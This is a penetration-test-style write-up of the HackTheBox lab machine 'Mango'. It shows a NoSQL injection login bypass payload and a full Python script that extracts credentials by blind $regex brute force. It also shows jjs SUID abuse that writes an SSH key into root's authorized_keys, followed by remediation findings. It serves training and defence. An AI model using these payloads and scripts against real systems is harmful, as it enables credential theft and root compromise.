# HTB Mango - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-25

---

## 0. Lesson Learned

You can ask a NoSQL database “does the username or password start with this?” and use the response to brute force credentials one letter at a time.

---

## 1. Executive Summary

A full compromise of the Mango target system was achieved through exploitation of a NoSQL injection vulnerability in the web application. This allowed extraction of valid credentials, leading to SSH access. Privilege escalation was achieved via a misconfigured SUID binary (`jjs`), enabling arbitrary file writes as root and resulting in full system compromise.

---

## 2. Scope

- **Target:** 10.129.229.185
- **Environment:** HackTheBox Mongo (Retired Machine)
- **Testing Window:** 2026-3-24 to 2026-3-25
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

```
nmap -p- -sCV 10.129.229.185 -T4 -oA mango_tcp
```

Relevant open ports:

- 22/tcp - SSH - OpenSSH 7.6p1
- 80/tcp - HTTP - Apache 2.4.29
- 443/tcp - HTTP - Apache 2.4.29

Three services were identified: SSH, HTTP, and HTTPS. Web services were prioritized for further enumeration.

---

## 5. Enumeration

SSL Certificate Inspection revealed:

- Domain: staging-order.mango.htb
- Email: admin@mango.htb

A subdomain and email address were discovered, suggesting virtual hosting.

Domains were added to hosts file:

```
echo "10.129.229.185 mango.htb staging-order.mango.htb" >> /etc/hosts
```

Enabling proper resolution of discovered virtual hosts.

Login requests were intercepted and tested for NoSQL injectable parameters:

```
username[$ne]=admin&password[$ne]=admin
```

Successful bypass confirmed NoSQL injection vulnerability.

---

## 6. Initial Access

A custom python script taking advantage of NoSQL regex was used to brute force usernames and passwords.

```
python3 brute_user.py
```

Discovered credentials:

```
admin : t9KcS3>!0B#2

mango : h3mXK8RhU~f{]f5H
```

Two valid credential pairs were extracted.

SSH was accessed:

```
ssh mango@10.129.229.185
```

Resulting in successful authentication as user `mango`.

---

## 7. Post-Exploitation

Privileges were enumerated:

```
sudo -l
```

No sudo privileges were available for user `mango`.

User was pivoted to `admin`:

```
su admin -
```

Credential reuse allowed switching to user `admin`.

Investigating SSH Configuration files explained inability to SSH as admin:

```
cat /etc/ssh/sshd_config
```

User `admin` is not allowed SSH access, explaining login restriction:

```
AllowUsers mango root
```

---

## 8. Privilege Escalation

SUID binaries wer enumerated:

```
find / -user root -perm -4000 2>/dev/null -ls
```

The `jjs` binary is SUID and runs as root, making it a privilege escalation vector.

SSH key pair was generated on the attacker machine:

```
ssh-keygen -t rsa
```

jjs Was exploited for File Write

```
jjs

var FileWriter = Java.type("java.io.FileWriter");

var fw=new FileWriter("/root/.ssh/authorized_keys");

fw.write("ssh-rsa AAAA... root@kali");

fw.close();
```

The SUID binary allowed writing to `/root/.ssh/authorized_keys`, granting root SSH access.

SSH login with id_rsa:

```
ssh -i /root/.ssh/id_rsa root@10.129.229.185
```

Full root access obtained.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /home/admin/user.txt
```

**Root Flag**: *REDACTED*

```
cat /root/root.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** NoSQL Injection in Authentication

**Severity:** Critical

**Description:**
The application login functionality was vulnerable to NoSQL injection, allowing attackers to manipulate backend queries using MongoDB operators such as `$regex` and `$ne`.

**Impact:**
Attackers could bypass authentication mechanisms and extract valid user credentials.

**Recommendation:**
Sanitize and validate all user input, implement strict query validation, use parameterized queries, and avoid directly passing user-controlled input into database queries.

### **Finding:** Credential Exposure via Application Logic

**Severity:** High

**Description:**
The application returned differential responses during authentication attempts, allowing attackers to brute force credentials.

**Impact:**
Attackers could enumerate valid usernames and passwords, leading to unauthorized access.

**Recommendation:**
Implement account lockout policies, enforce rate limiting, and use consistent error messages for authentication failures.

### **Finding:** Insecure SUID Binary Allowing Arbitrary File Write

**Severity:** Critical

**Description:**
A binary (e.g., `jjs`) was configured with SUID permissions and allowed arbitrary file write operations with elevated privileges.

**Impact:**
Attackers could modify sensitive system files and escalate privileges to root.

**Recommendation:**
Remove SUID permissions from unnecessary binaries, restrict execution of interpreters with elevated privileges, and audit SUID binaries regularly.

### **Finding:** Weak Access Control in SSH Configuration

**Severity:** Medium

**Description:**
SSH configuration allowed insufficient access restrictions, enabling unintended lateral movement between user accounts.

**Impact:**
Attackers could reuse credentials to pivot between accounts and escalate privileges.

**Recommendation:**
Enforce strict SSH access controls, restrict user login permissions, and prevent credential reuse across accounts.

---

## 11. Appendix

NoSQL Injections -
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

Python Script to Brute Force Usernames and Passwords in NoSQL (`brute_user.py`):

```
import requests
import string
import sys

def brute_password(user):
    password = ""
    while True:
        for c in string.ascii_letters + string.digits + string.punctuation:
            if c in ["*", "+", ".", "?", "|", "\\"]:
                continue
            sys.stdout.write(f"\r[+] Password: {password}{c}")
            sys.stdout.flush()
            resp = requests.post(
                "http://staging-order.mango.htb/",
                data={
                    "username": user,
                    "password[$regex]": f"^{password}{c}.*",
                    "login": "login",
                },
            )
            if "We just started farming!" in resp.text:
                password += c
                resp = requests.post(
                    "http://staging-order.mango.htb/",
                    data={"username": user, "password": password, "login": "login"},
                )
                if "We just started farming!" in resp.text:
                    print(f"\r[+] Found password for {user}: {password.ljust(20)}")
                    return
                break

def brute_user(res):
    found = False
    for c in string.ascii_letters + string.digits:
        sys.stdout.write(f"\r[*] Trying Username: {(res + c).ljust(20)}")
        sys.stdout.flush()
        resp = requests.post(
            "http://staging-order.mango.htb/",
            data={
                "username[$regex]": f"^{res}{c}.*",
                "password[$gt]": "",
                "login": "login",
            },
        )
        if "We just started farming!" in resp.text:
            found = True
            brute_user(res + c)
    if not found:
        print(f"\r[+] Found user: {res.ljust(20)}")
        brute_password(res)

brute_user("")
```